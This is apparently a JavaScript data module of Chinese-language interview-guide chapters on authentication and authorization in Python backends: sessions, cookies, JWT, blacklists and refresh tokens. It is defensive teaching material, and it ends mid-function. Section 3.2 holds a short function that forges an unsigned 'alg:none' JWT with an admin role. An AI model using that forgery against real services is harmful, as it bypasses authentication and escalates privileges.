// =============================================================
// Python后端面试指南 - 第15批章节（认证授权与安全 8章）
// =============================================================

export const chapters = [
  {
    id: "pyb-15-1",
    group: "认证授权与安全",
    icon: "🔐",
    title: "认证与授权概述",
    content: `

# 认证与授权概述

## 一、核心概念区分

### 1.1 Authentication vs Authorization

| 概念 | 中文 | 含义 | 核心问题 | 常见实现 |
|------|------|------|---------|---------|
| Authentication | 认证 | 验证用户身份 | "你是谁？" | 密码、验证码、Token、生物识别 |
| Authorization | 授权 | 验证用户权限 | "你能做什么？" | RBAC、ABAC、ACL、权限中间件 |

**类比理解：**
- 认证：进入大楼时出示身份证，证明你是这个人
- 授权：进入大楼后，你的门禁卡能开哪些门

### 1.2 认证流程示例

\`\`\`
┌──────────┐     ┌──────────┐     ┌──────────┐
│  客户端   │────▶│  认证服务  │────▶│  数据库   │
│          │     │          │     │          │
│  登录请求 │     │ 验证凭证   │     │ 查询用户   │
│◀─────────│     │◀─────────│     │          │
│  返回Token│     │ 生成Token │     │          │
└──────────┘     └──────────┘     └──────────┘
     │
     │ 后续请求携带Token
     ▼
┌──────────┐     ┌──────────┐
│  API服务  │────▶│ 验证Token │
│          │     │ 解析用户信息│
│ 业务逻辑  │◀────│          │
└──────────┘     └──────────┘
\`\`\`

---

## 二、常见认证方式对比

### 2.1 认证方式全景图

| 认证方式 | 适用场景 | 优点 | 缺点 | 安全性 |
|---------|---------|------|------|--------|
| Session-Cookie | Web应用、同域 | 简单、服务端可控注销 | CSRF风险、分布式麻烦 | 中 |
| Token | SPA、移动端 | 无状态、跨域友好 | 无法主动作废 | 中 |
| JWT | 微服务、前后端分离 | 自包含、跨服务 | 体积大、无法作废 | 中高 |
| OAuth2.0 | 第三方登录 | 标准化、安全 | 复杂、学习曲线陡 | 高 |
| OIDC | 单点登录 | 基于OAuth2+身份层 | 更复杂 | 高 |
| API Key | 服务间调用 | 简单、易管理 | 泄露风险 | 中 |
| mTLS | 高安全场景 | 双向认证 | 证书管理复杂 | 极高 |

### 2.2 Session-Cookie认证

\`\`\`python
from fastapi import FastAPI, Request, Response, HTTPException
from fastapi.responses import JSONResponse
import uuid
import time

app = FastAPI()

# 内存存储session（生产用Redis）
sessions = {}
SESSION_TIMEOUT = 3600  # 1小时

@app.post("/login")
async def login(request: Request, response: Response):
    data = await request.json()
    username = data.get("username")
    password = data.get("password")

    # 验证用户（实际应查数据库）
    user = verify_user(username, password)
    if not user:
        raise HTTPException(status_code=401, detail="用户名或密码错误")

    # 创建session
    session_id = str(uuid.uuid4())
    sessions[session_id] = {
        "user_id": user["id"],
        "username": user["username"],
        "role": user["role"],
        "created_at": time.time()
    }

    # 设置Cookie
    response.set_cookie(
        key="session_id",
        value=session_id,
        httponly=True,        # 防止XSS
        secure=True,          # HTTPS only
        samesite="lax",       # 防止CSRF
        max_age=SESSION_TIMEOUT
    )

    return {"message": "登录成功"}

@app.get("/me")
async def get_me(request: Request):
    session_id = request.cookies.get("session_id")
    if not session_id or session_id not in sessions:
        raise HTTPException(status_code=401, detail="未登录")

    session = sessions[session_id]
    if time.time() - session["created_at"] > SESSION_TIMEOUT:
        del sessions[session_id]
        raise HTTPException(status_code=401, detail="会话过期")

    return {"user_id": session["user_id"], "username": session["username"]}

@app.post("/logout")
async def logout(request: Request, response: Response):
    session_id = request.cookies.get("session_id")
    if session_id and session_id in sessions:
        del sessions[session_id]
    response.delete_cookie("session_id")
    return {"message": "退出成功"}
\`\`\`

### 2.3 Token认证

\`\`\`python
from fastapi import FastAPI, Header, HTTPException, Depends
import secrets
import time

app = FastAPI()

# Token存储
tokens = {}
TOKEN_TIMEOUT = 7200  # 2小时

def create_token(user_id: int) -> str:
    token = secrets.token_hex(32)
    tokens[token] = {
        "user_id": user_id,
        "created_at": time.time()
    }
    return token

async def get_current_user(authorization: str = Header(...)):
    if not authorization.startswith("Bearer "):
        raise HTTPException(status_code=401, detail="Invalid token format")

    token = authorization[7:]
    if token not in tokens:
        raise HTTPException(status_code=401, detail="Token无效")

    token_data = tokens[token]
    if time.time() - token_data["created_at"] > TOKEN_TIMEOUT:
        del tokens[token]
        raise HTTPException(status_code=401, detail="Token过期")

    return token_data["user_id"]

@app.post("/login")
async def login(request: Request):
    data = await request.json()
    user = verify_user(data["username"], data["password"])
    if not user:
        raise HTTPException(401, "用户名或密码错误")

    token = create_token(user["id"])
    return {"access_token": token, "token_type": "bearer", "expires_in": TOKEN_TIMEOUT}

@app.get("/me")
async def me(user_id: int = Depends(get_current_user)):
    return {"user_id": user_id}
\`\`\`

---

## 三、认证方案选型

### 3.1 选型决策矩阵

| 场景 | 推荐方案 | 理由 |
|------|---------|------|
| 传统Web网站（同域） | Session-Cookie | 浏览器原生支持、安全 |
| 前后端分离SPA | JWT/Token | 跨域友好、无状态 |
| 移动端App | Token/JWT | 原生支持Token存储 |
| 微服务架构 | JWT/OAuth2 | 自包含、无需查Session |
| 第三方登录 | OAuth2.0/OIDC | 标准协议、用户信任 |
| 服务间调用 | API Key/mTLS | 简单、高性能 |
| 高安全金融场景 | mTLS+OAuth2 | 多层防护 |

### 3.2 各方案详细对比

\`\`\`python
# 不同认证方案的核心特性

# 1. Session-Cookie特性
session_features = {
    "state": "有状态（服务端存储）",
    "scalability": "需要Session共享",
    "csrf_risk": "有（需要CSRF Token）",
    "xss_risk": "较低（HttpOnly Cookie）",
    "logout": "可实时注销",
    "cross_domain": "跨域困难",
    "mobile": "不便（需要处理Cookie）",
}

# 2. JWT特性
jwt_features = {
    "state": "无状态（自包含）",
    "scalability": "易水平扩展",
    "csrf_risk": "无（不依赖Cookie）",
    "xss_risk": "有（存储在localStorage）",
    "logout": "无法主动作废（需黑名单）",
    "cross_domain": "友好",
    "mobile": "友好",
}

# 3. OAuth2特性
oauth_features = {
    "state": "取决于实现",
    "scalability": "好",
    "csrf_risk": "需处理state参数",
    "xss_risk": "取决于Token存储",
    "logout": "支持",
    "cross_domain": "设计目标",
    "mobile": "支持",
}
\`\`\`

---

## 四、安全基础原则

### 4.1 认证安全原则

1. **永远不在客户端存储敏感信息**
   - 密码：只存哈希，不存明文
   - Token：使用HttpOnly Cookie或安全存储

2. **使用HTTPS传输**
   - 所有认证请求必须HTTPS
   - 生产环境禁用HTTP

3. **密码安全**
   - 强哈希算法（bcrypt/Argon2）
   - 加盐
   - 密码复杂度要求
   - 登录失败限制

4. **防暴力破解**
   - IP限流
   - 账号锁定
   - 验证码
   - 异常登录检测

### 4.2 认证常见攻击面

| 攻击类型 | 描述 | 防御措施 |
|---------|------|---------|
| 暴力破解 | 尝试大量密码组合 | 限流、验证码、锁定 |
| 凭证填充 | 使用泄露的密码库撞库 | 密码哈希、MFA、异常检测 |
| 会话劫持 | 窃取Session/Token | HTTPS、Cookie安全属性、Token过期 |
| CSRF | 跨站请求伪造 | CSRF Token、SameSite Cookie |
| XSS | 注入脚本窃取Token | 输入过滤、输出转义、CSP |
| 中间人攻击 | 拦截篡改通信 | HTTPS、证书固定 |

---

## 五、最佳实践与常见坑点

### 5.1 认证设计最佳实践

1. **最小权限原则**：默认无权限，按需授权
2. **深度防御**：多层安全措施，不依赖单一防护
3. **失败安全**：认证失败时默认拒绝访问
4. **完整审计**：记录所有认证尝试（成功/失败）
5. **安全传输**：全程HTTPS
6. **合理过期**：Token/会话设置合理过期时间
7. **多因素认证**：敏感操作启用MFA

\`\`\`python
# 安全的密码验证流程
import re
from typing import Tuple

def validate_password_strength(password: str) -> Tuple[bool, str]:
    """验证密码强度"""
    if len(password) < 8:
        return False, "密码至少8个字符"
    if not re.search(r"[a-z]", password):
        return False, "密码需包含小写字母"
    if not re.search(r"[A-Z]", password):
        return False, "密码需包含大写字母"
    if not re.search(r"\\d", password):
        return False, "密码需包含数字"
    if not re.search(r"[!@#$%^&*(),.?\\":{}|<>]", password):
        return False, "密码需包含特殊字符"
    return True, "密码强度合格"

# 登录限流（简单实现）
from collections import defaultdict
import time

login_attempts = defaultdict(list)
MAX_ATTEMPTS = 5
LOCKOUT_TIME = 900  # 15分钟

def check_rate_limit(ip: str) -> bool:
    now = time.time()
    attempts = [t for t in login_attempts[ip] if now - t < LOCKOUT_TIME]
    login_attempts[ip] = attempts
    return len(attempts) < MAX_ATTEMPTS

def record_failed_attempt(ip: str):
    login_attempts[ip].append(time.time())
\`\`\`

### 5.2 常见坑点

**坑点1：明文存储密码**

\`\`\`python
# 错误：明文或简单哈希存储密码
def create_user(username, password):
    db.execute("INSERT INTO users (username, password) VALUES (?, ?)",
               (username, password))  # 明文！
    # 或
    db.execute("INSERT INTO users (username, password) VALUES (?, ?)",
               (username, hashlib.md5(password.encode()).hexdigest()))  # MD5不安全！

# 正确：使用bcrypt/Argon2
import bcrypt

def hash_password(password: str) -> bytes:
    salt = bcrypt.gensalt(rounds=12)
    return bcrypt.hashpw(password.encode(), salt)

def verify_password(password: str, hashed: bytes) -> bool:
    return bcrypt.checkpw(password.encode(), hashed)
\`\`\`

**坑点2：Token永不过期**

\`\`\`python
# 错误：Token没有过期时间
def create_token(user_id):
    payload = {"user_id": user_id}  # 没有exp！
    return jwt.encode(payload, SECRET_KEY)

# 正确：设置过期时间
from datetime import datetime, timedelta

def create_token(user_id):
    payload = {
        "user_id": user_id,
        "iat": datetime.utcnow(),
        "exp": datetime.utcnow() + timedelta(hours=2),  # 2小时过期
        "jti": str(uuid.uuid4())  # Token ID，用于黑名单
    }
    return jwt.encode(payload, SECRET_KEY, algorithm="HS256")
\`\`\`

**坑点3：错误信息泄露**

\`\`\`python
# 错误：返回详细错误信息，帮助攻击者
@app.post("/login")
async def login(data: LoginRequest):
    user = db.query(User).filter(User.email == data.email).first()
    if not user:
        raise HTTPException(401, "邮箱不存在")  # 泄露邮箱是否存在
    if not verify_password(data.password, user.password_hash):
        raise HTTPException(401, "密码错误")  # 进一步确认邮箱存在

# 正确：统一错误信息
@app.post("/login")
async def login(data: LoginRequest):
    user = db.query(User).filter(User.email == data.email).first()
    if not user or not verify_password(data.password, user.password_hash):
        raise HTTPException(401, "邮箱或密码错误")  # 不区分
\`\`\`
`
  },
  {
    id: "pyb-15-2",
    group: "认证授权与安全",
    icon: "🔐",
    title: "Session认证机制",
    content: `

# Session认证机制

## 一、Session工作原理

### 1.1 Session生命周期

\`\`\`
1. 用户首次访问
   └─→ 服务器创建Session（分配唯一SessionID）
       └─→ SessionID通过Cookie返回给浏览器

2. 后续请求
   └─→ 浏览器自动携带Cookie中的SessionID
       └─→ 服务器根据SessionID查找对应Session数据

3. Session过期/注销
   └─→ 服务器删除Session数据
       └─→ 浏览器删除Cookie
\`\`\`

### 1.2 Session vs Cookie

| 特性 | Cookie | Session |
|------|--------|---------|
| 存储位置 | 客户端浏览器 | 服务器 |
| 安全性 | 较低（可被篡改） | 较高（客户端无法直接修改） |
| 存储容量 | ~4KB | 取决于服务器存储 |
| 生命周期 | 可设置过期时间 | 可过期、可主动销毁 |
| 跨域 | 受同源策略限制 | 与Cookie配合 |
| 性能 | 每次请求自动携带 | 需要服务器查询 |

---

## 二、Session存储方案

### 2.1 存储方案对比

| 存储方式 | 优点 | 缺点 | 适用场景 |
|---------|------|------|---------|
| 内存 | 快、简单 | 重启丢失、无法分布式 | 开发环境、单实例 |
| 数据库 | 持久化、可靠 | 性能较差 | 小规模应用 |
| Redis | 高性能、支持过期、分布式 | 需要额外部署 | 生产环境、分布式 |
| Memcached | 高性能、分布式 | 无持久化、内存限制 | 纯缓存场景 |

### 2.2 内存Session（开发用）

\`\`\`python
from fastapi import FastAPI, Request, Response, HTTPException
import uuid
import time
from typing import Dict, Any

app = FastAPI()

class MemorySessionStore:
    def __init__(self, timeout: int = 3600):
        self.sessions: Dict[str, Dict[str, Any]] = {}
        self.timeout = timeout

    def create(self, data: Dict[str, Any]) -> str:
        session_id = str(uuid.uuid4())
        self.sessions[session_id] = {
            "data": data,
            "created_at": time.time(),
            "last_accessed": time.time()
        }
        return session_id

    def get(self, session_id: str) -> Dict[str, Any]:
        if session_id not in self.sessions:
            return None
        session = self.sessions[session_id]
        if time.time() - session["last_accessed"] > self.timeout:
            self.delete(session_id)
            return None
        session["last_accessed"] = time.time()
        return session["data"]

    def delete(self, session_id: str):
        if session_id in self.sessions:
            del self.sessions[session_id]

    def cleanup_expired(self):
        """清理过期Session，应定时调用"""
        now = time.time()
        expired = [
            sid for sid, session in self.sessions.items()
            if now - session["last_accessed"] > self.timeout
        ]
        for sid in expired:
            del self.sessions[sid]

session_store = MemorySessionStore()
\`\`\`

### 2.3 Redis Session（生产用）

\`\`\`python
import redis
import json
import uuid
from typing import Optional, Any

class RedisSessionStore:
    def __init__(self, redis_url: str = "redis://localhost:6379/0", timeout: int = 3600):
        self.redis = redis.from_url(redis_url)
        self.timeout = timeout
        self.prefix = "session:"

    def create(self, data: dict) -> str:
        session_id = str(uuid.uuid4())
        key = f"{self.prefix}{session_id}"
        self.redis.setex(
            key,
            self.timeout,
            json.dumps(data)
        )
        return session_id

    def get(self, session_id: str) -> Optional[dict]:
        key = f"{self.prefix}{session_id}"
        data = self.redis.get(key)
        if not data:
            return None
        # 刷新过期时间（滑动窗口过期）
        self.redis.expire(key, self.timeout)
        return json.loads(data)

    def delete(self, session_id: str):
        key = f"{self.prefix}{session_id}"
        self.redis.delete(key)

    def cleanup_expired(self):
        # Redis自动过期，无需手动清理
        pass

# 使用示例
session_store = RedisSessionStore()

@app.post("/login")
async def login(response: Response, request: Request):
    data = await request.json()
    user = authenticate_user(data["username"], data["password"])
    if not user:
        raise HTTPException(401, "登录失败")

    session_id = session_store.create({
        "user_id": user.id,
        "username": user.username,
        "role": user.role
    })

    response.set_cookie(
        "session_id",
        session_id,
        httponly=True,
        secure=True,
        samesite="lax",
        max_age=session_store.timeout
    )
    return {"message": "登录成功"}
\`\`\`

---

## 三、分布式Session一致性

### 3.1 分布式Session问题

\`\`\`
问题场景：
┌─────────┐    ┌─────────┐
│ 用户请求  │───▶│ 服务器A  │ （Session在A的内存）
└─────────┘    └─────────┘
     │
     │ 下一个请求被负载均衡到B
     ▼
┌─────────┐    ┌─────────┐
│ 用户请求  │───▶│ 服务器B  │ （B没有这个Session！）
└─────────┘    └─────────┘
\`\`\`

### 3.2 解决方案对比

| 方案 | 优点 | 缺点 |
|------|------|------|
| Session复制 | 各服务器数据一致 | 复制延迟、内存占用大、扩展难 |
| Sticky Session | 实现简单、无需改造 | 负载不均衡、故障影响大 |
| Session共享 | 水平扩展好、数据一致 | 需要Redis等中间件 |
| JWT（无Session） | 完全无状态、易扩展 | 无法主动作废、体积大 |

### 3.3 Session共享（推荐）

\`\`\`python
# 使用Redis实现Session共享
# 所有应用实例连接同一个Redis集群

# 架构：
# 负载均衡 → [App1, App2, App3] → Redis集群（Session存储）

from fastapi_sessions.backends.implementations import InMemoryBackend
from fastapi_sessions.session_verifier import SessionVerifier
from fastapi_sessions.frontends.implementations import SessionCookie, CookieParameters

# FastAPI-Sessions库示例
cookie_params = CookieParameters(
    httponly=True,
    secure=True,
    samesite="lax",
    max_age=3600
)

cookie = SessionCookie(
    cookie_name="session_id",
    identifier="general_verifier",
    auto_error=True,
    secret_key="your-secret-key",
    cookie_params=cookie_params
)

class SessionData(BaseModel):
    user_id: int
    username: str
    role: str

backend = InMemoryBackend[UUID, SessionData]()

class Verifier(SessionVerifier):
    identifier = "general_verifier"
    backend = backend
    auth_http_exception = HTTPException(status_code=401, detail="无效会话")
    cookie = cookie
\`\`\`

### 3.4 Sticky Session配置（Nginx示例）

\`\`\`nginx
upstream backend {
    ip_hash;  # 基于客户端IP哈希，同一IP访问同一服务器
    server 192.168.1.10:8000;
    server 192.168.1.11:8000;
    server 192.168.1.12:8000;
}

server {
    listen 80;
    location / {
        proxy_pass http://backend;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
    }
}
\`\`\`

---

## 四、Session安全

### 4.1 Cookie安全属性

| 属性 | 作用 | 推荐值 |
|------|------|--------|
| HttpOnly | 禁止JavaScript访问Cookie | True |
| Secure | 仅HTTPS传输 | True（生产） |
| SameSite | 控制跨站发送 | Lax或Strict |
| Domain | Cookie作用域 | 精确域名 |
| Path | Cookie路径 | 最小必要路径 |
| Max-Age | 过期时间 | 根据业务（15min-24h） |

\`\`\`python
response.set_cookie(
    key="session_id",
    value=session_id,
    httponly=True,        # 关键：防止XSS窃取
    secure=True,          # 关键：HTTPS only
    samesite="lax",       # 关键：防止CSRF
    domain=".example.com",
    path="/",
    max_age=3600,
)
\`\`\`

### 4.2 Session固定攻击防护

Session固定攻击：攻击者诱导用户使用预设的SessionID登录，然后用该ID访问。

\`\`\`python
# 防护措施：登录后重新生成SessionID
@app.post("/login")
async def login(request: Request, response: Response):
    # 验证密码
    user = verify_credentials(...)

    # 关键：登录前销毁旧Session，登录后创建新Session
    old_session_id = request.cookies.get("session_id")
    if old_session_id:
        session_store.delete(old_session_id)

    # 创建新Session
    new_session_id = session_store.create({"user_id": user.id})
    response.set_cookie("session_id", new_session_id, ...)

    return {"message": "登录成功"}
\`\`\`

### 4.3 Session超时配置

\`\`\`python
class SessionConfig:
    # 绝对超时：无论活跃与否，到此时间必须重新登录
    ABSOLUTE_TIMEOUT = 8 * 3600  # 8小时

    # 滑动超时：无操作超时
    IDLE_TIMEOUT = 30 * 60  # 30分钟

    # 关键操作后重新认证
    REQUIRE_REAUTH_TIMEOUT = 15 * 60  # 15分钟（如支付）

def get_session(session_id: str) -> Optional[dict]:
    session = session_store.get(session_id)
    if not session:
        return None

    now = time.time()

    # 检查绝对超时
    if now - session["created_at"] > ABSOLUTE_TIMEOUT:
        session_store.delete(session_id)
        return None

    # 检查空闲超时
    if now - session["last_accessed"] > IDLE_TIMEOUT:
        session_store.delete(session_id)
        return None

    return session
\`\`\`

---

## 五、最佳实践与常见坑点

### 5.1 Session最佳实践

1. **使用Redis等分布式存储**（生产环境）
2. **Cookie设置安全属性**：HttpOnly、Secure、SameSite
3. **登录后重新生成SessionID**（防固定攻击）
4. **设置合理的超时时间**
5. **关键操作要求重新验证**
6. **SessionID使用安全的随机生成器**（uuid4/secrets）
7. **支持主动注销**（服务端删除Session）
8. **定期清理过期Session**

\`\`\`python
# Session中间件完整示例
from starlette.middleware.base import BaseHTTPMiddleware
from starlette.requests import Request
import secrets

class SessionMiddleware(BaseHTTPMiddleware):
    def __init__(self, app, session_store, secure_cookies=True):
        super().__init__(app)
        self.session_store = session_store
        self.secure_cookies = secure_cookies

    async def dispatch(self, request: Request, call_next):
        # 解析Session
        session_id = request.cookies.get("session_id")
        request.state.session = None
        request.state.session_id = None

        if session_id:
            session_data = self.session_store.get(session_id)
            if session_data:
                request.state.session = session_data
                request.state.session_id = session_id

        # 处理请求
        response = await call_next(request)

        # 如果Session被修改，保存
        if hasattr(request.state, "session_modified") and request.state.session_modified:
            if hasattr(request.state, "new_session_data"):
                # 创建新Session
                if session_id:
                    self.session_store.delete(session_id)
                new_id = self.session_store.create(request.state.new_session_data)
                response.set_cookie(
                    "session_id", new_id,
                    httponly=True,
                    secure=self.secure_cookies,
                    samesite="lax",
                    max_age=3600
                )
            elif hasattr(request.state, "clear_session") and request.state.clear_session:
                # 销毁Session
                if session_id:
                    self.session_store.delete(session_id)
                response.delete_cookie("session_id")

        return response
\`\`\`

### 5.2 常见坑点

**坑点1：SessionID放在URL中**

\`\`\`python
# 错误：URL中传递SessionID（会被Referrer泄露）
@app.get("/")
async def index(session_id: str = None):
    # session_id在URL中会被日志、Referrer记录
    pass

# 正确：使用Cookie传递
# 浏览器自动处理，更安全
\`\`\`

**坑点2：不设置HttpOnly导致XSS窃取**

\`\`\`python
# 错误：不设置HttpOnly
response.set_cookie("session_id", session_id)  # 默认不是HttpOnly！

# 正确：强制HttpOnly
response.set_cookie("session_id", session_id, httponly=True)
\`\`\`

**坑点3：分布式环境使用内存Session**

\`\`\`python
# 错误：多实例部署时用内存存储
# 用户在A实例登录，下次请求到B实例就需要重新登录
sessions = {}  # 进程内变量，多实例不共享

# 正确：使用Redis集中存储
\`\`\`
`
  },
  {
    id: "pyb-15-3",
    group: "认证授权与安全",
    icon: "🔐",
    title: "JWT深度解析",
    content: `

# JWT深度解析

## 一、JWT结构

### 1.1 JWT组成

JWT（JSON Web Token）由三部分组成，用点（.）分隔：

\`\`\`
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxLCJleHAiOjE3MDAwMDAwMDB9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
└──────────────────────┘└──────────────────────────────┘└─────────────────────────────────────────┘
       Header（头部）              Payload（载荷）                 Signature（签名）
\`\`\`

### 1.2 Header

\`\`\`json
{
  "alg": "HS256",   // 签名算法
  "typ": "JWT"      // Token类型
}
\`\`\`

| alg参数 | 算法 | 密钥类型 | 安全性 |
|---------|------|---------|--------|
| HS256 | HMAC-SHA256 | 对称密钥 | 中 |
| HS384 | HMAC-SHA384 | 对称密钥 | 中高 |
| HS512 | HMAC-SHA512 | 对称密钥 | 高 |
| RS256 | RSA-SHA256 | 非对称（私钥签名，公钥验证） | 高 |
| RS384 | RSA-SHA384 | 非对称 | 高 |
| RS512 | RSA-SHA512 | 非对称 | 极高 |
| ES256 | ECDSA P-256 | 非对称（更短密钥） | 高 |
| none | 无签名 | - | 极危险！禁止使用 |

### 1.3 Payload（Claims）

\`\`\`json
{
  // 注册声明（Registered Claims）
  "iss": "auth.example.com",      // Issuer：签发者
  "sub": "user123",               // Subject：主题（用户ID）
  "aud": "api.example.com",       // Audience：受众
  "exp": 1700000000,              // Expiration Time：过期时间
  "nbf": 1699999999,              // Not Before：生效时间
  "iat": 1699996400,              // Issued At：签发时间
  "jti": "uuid-1234",             // JWT ID：唯一标识

  // 公共声明（Public Claims）
  "username": "zhangsan",

  // 私有声明（Private Claims）
  "user_id": 123,
  "role": "admin",
  "permissions": ["user:read", "user:write"]
}
\`\`\`

### 1.4 Signature

\`\`\`
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  secret_key
)
\`\`\`

---

## 二、Python JWT库使用

### 2.1 python-jose（FastAPI推荐）

\`\`\`python
from datetime import datetime, timedelta
from typing import Optional
from jose import JWTError, jwt
from pydantic import BaseModel
import uuid

# 配置
SECRET_KEY = "your-super-secret-key-change-in-production"
ALGORITHM = "HS256"
ACCESS_TOKEN_EXPIRE_MINUTES = 30
REFRESH_TOKEN_EXPIRE_DAYS = 7

class TokenData(BaseModel):
    user_id: Optional[int] = None
    username: Optional[str] = None
    role: Optional[str] = None
    jti: Optional[str] = None

def create_access_token(data: dict, expires_delta: Optional[timedelta] = None) -> str:
    """创建Access Token"""
    to_encode = data.copy()
    expire = datetime.utcnow() + (expires_delta or timedelta(minutes=ACCESS_TOKEN_EXPIRE_MINUTES))
    to_encode.update({
        "exp": expire,
        "iat": datetime.utcnow(),
        "jti": str(uuid.uuid4()),
        "type": "access"
    })
    return jwt.encode(to_encode, SECRET_KEY, algorithm=ALGORITHM)

def create_refresh_token(data: dict) -> str:
    """创建Refresh Token（有效期更长）"""
    to_encode = data.copy()
    expire = datetime.utcnow() + timedelta(days=REFRESH_TOKEN_EXPIRE_DAYS)
    to_encode.update({
        "exp": expire,
        "iat": datetime.utcnow(),
        "jti": str(uuid.uuid4()),
        "type": "refresh"
    })
    return jwt.encode(to_encode, SECRET_KEY, algorithm=ALGORITHM)

def verify_token(token: str) -> TokenData:
    """验证并解析Token"""
    try:
        payload = jwt.decode(
            token,
            SECRET_KEY,
            algorithms=[ALGORITHM],
            options={
                "verify_exp": True,
                "verify_iss": False,
                "require_exp": True,
            }
        )

        user_id: int = payload.get("user_id")
        if user_id is None:
            raise JWTError("Missing user_id")

        return TokenData(
            user_id=user_id,
            username=payload.get("username"),
            role=payload.get("role"),
            jti=payload.get("jti")
        )
    except JWTError as e:
        raise ValueError(f"Token无效: {str(e)}")

# 使用示例
access_token = create_access_token({"user_id": 1, "username": "zhangsan", "role": "user"})
refresh_token = create_refresh_token({"user_id": 1})

token_data = verify_token(access_token)
print(f"用户ID: {token_data.user_id}, 角色: {token_data.role}")
\`\`\`

### 2.2 RS256非对称签名

\`\`\`python
# 生成密钥对：
# ssh-keygen -t rsa -b 4096 -m PEM -f private.key
# openssl rsa -in private.key -pubout -outform PEM -out public.key

# 读取密钥
with open("private.key", "rb") as f:
    PRIVATE_KEY = f.read()
with open("public.key", "rb") as f:
    PUBLIC_KEY = f.read()

def create_token_rsa(data: dict) -> str:
    """使用私钥签名"""
    to_encode = data.copy()
    to_encode.update({
        "exp": datetime.utcnow() + timedelta(minutes=30),
        "iat": datetime.utcnow(),
    })
    return jwt.encode(to_encode, PRIVATE_KEY, algorithm="RS256")

def verify_token_rsa(token: str) -> dict:
    """使用公钥验证"""
    return jwt.decode(token, PUBLIC_KEY, algorithms=["RS256"])
\`\`\`

---

## 三、JWT安全漏洞

### 3.1 常见漏洞

| 漏洞类型 | 描述 | 防御 |
|---------|------|------|
| 无签名算法（alg:none） | 攻击者将alg改为none绕过签名 | 验证时指定算法，禁用none |
| 算法混淆 | RS256公钥当HS256密钥用 | 严格校验算法，使用不同密钥 |
| 过期绕过 | 不验证exp声明 | 必须验证exp |
| 密钥泄露 | 弱密钥或泄露密钥 | 强密钥、定期轮换、环境变量存储 |
| 信息泄露 | Payload未加密，敏感信息 | 不存敏感数据、需要时加密JWE |
| Token重放 | 被盗用的Token仍可用 | 短过期+黑名单、jti机制 |

### 3.2 无签名攻击演示与防御

\`\`\`python
# 攻击：构造alg:none的Token
import base64
import json

def create_none_token(payload: dict) -> str:
    header = base64.urlsafe_b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).rstrip(b"=")
    payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b"=")
    signature = b""  # 空签名
    return f"{header.decode()}.{payload_b64.decode()}.{signature.decode()}"

# 恶意Token：
# fake_token = create_none_token({"user_id": 1, "role": "admin"})

# 防御：验证时指定算法，绝不接受none
def verify_token_safe(token: str) -> dict:
    try:
        # 关键：指定允许的算法，不使用token header中的alg
        payload = jwt.decode(
            token,
            SECRET_KEY,
            algorithms=["HS256"],  # 明确指定算法！
            options={"verify_signature": True}
        )
        return payload
    except JWTError:
        raise ValueError("Token无效")
\`\`\`

### 3.3 算法混淆攻击防御

\`\`\`python
# 错误：接受所有算法（或从header读取算法）
jwt.decode(token, key)  # 可能被攻击

# 正确：明确指定算法列表
ALLOWED_ALGORITHMS = ["HS256"]  # 或 ["RS256"]
jwt.decode(token, key, algorithms=ALLOWED_ALGORITHMS)
\`\`\`

### 3.4 Token黑名单实现

JWT是无状态的，无法主动作废，需要黑名单机制：

\`\`\`python
import redis
from datetime import datetime

class TokenBlacklist:
    def __init__(self, redis_url: str = "redis://localhost:6379/1"):
        self.redis = redis.from_url(redis_url)
        self.prefix = "blacklist:"

    def add(self, jti: str, exp: datetime):
        """将Token加入黑名单，直到过期"""
        ttl = int((exp - datetime.utcnow()).total_seconds())
        if ttl > 0:
            self.redis.setex(f"{self.prefix}{jti}", ttl, "1")

    def is_blacklisted(self, jti: str) -> bool:
        return bool(self.redis.exists(f"{self.prefix}{jti}"))

blacklist = TokenBlacklist()

def verify_token_with_blacklist(token: str) -> TokenData:
    token_data = verify_token(token)
    if blacklist.is_blacklisted(token_data.jti):
        raise ValueError("Token已被作废")
    return token_data

@app.post("/logout")
async def logout(token: str = Depends(oauth2_scheme)):
    try:
        payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
        jti = payload.get("jti")
        exp = datetime.fromtimestamp(payload.get("exp", 0))
        if jti:
            blacklist.add(jti, exp)
        return {"message": "退出成功"}
    except JWTError:
        raise HTTPException(401, "无效Token")
\`\`\`

---

## 四、刷新令牌策略

### 4.1 双Token机制

\`\`\`
登录：
┌──────────┐
│ 用户名密码 │ ──▶ 返回 Access Token（短过期，如15min）
└──────────┘      Refresh Token（长过期，如7天）

Access Token过期：
┌──────────┐
│ Refresh  │ ──▶ 换取新的Access Token
│ Token    │     （如果Refresh Token没过期/没被吊销）
└──────────┘
\`\`\`

\`\`\`python
from fastapi import FastAPI, Depends, HTTPException, status
from fastapi.security import OAuth2PasswordBearer, OAuth2PasswordRequestForm
from pydantic import BaseModel
from datetime import datetime

app = FastAPI()

oauth2_scheme = OAuth2PasswordBearer(tokenUrl="token")

class Token(BaseModel):
    access_token: str
    refresh_token: str
    token_type: str = "bearer"
    expires_in: int = 1800  # 30分钟

class RefreshTokenRequest(BaseModel):
    refresh_token: str

# Refresh Token存储（Redis中）
refresh_tokens = redis.from_url("redis://localhost:6379/2")

@app.post("/token", response_model=Token)
async def login(form_data: OAuth2PasswordRequestForm = Depends()):
    user = authenticate_user(form_data.username, form_data.password)
    if not user:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="用户名或密码错误"
        )

    # 创建Access Token
    access_token = create_access_token(
        data={"user_id": user.id, "username": user.username, "role": user.role}
    )

    # 创建Refresh Token
    refresh_token = create_refresh_token(data={"user_id": user.id})
    refresh_jti = jwt.decode(refresh_token, SECRET_KEY, algorithms=[ALGORITHM])["jti"]

    # 存储Refresh Token（关联用户，可吊销）
    refresh_tokens.setex(
        f"refresh:{refresh_jti}",
        REFRESH_TOKEN_EXPIRE_DAYS * 86400,
        str(user.id)
    )

    return Token(
        access_token=access_token,
        refresh_token=refresh_token,
        expires_in=ACCESS_TOKEN_EXPIRE_MINUTES * 60
    )

@app.post("/refresh", response_model=Token)
async def refresh_token(request: RefreshTokenRequest):
    try:
        payload = jwt.decode(
            request.refresh_token,
            SECRET_KEY,
            algorithms=[ALGORITHM]
        )
        jti = payload.get("jti")
        user_id = payload.get("user_id")

        # 检查Refresh Token是否有效
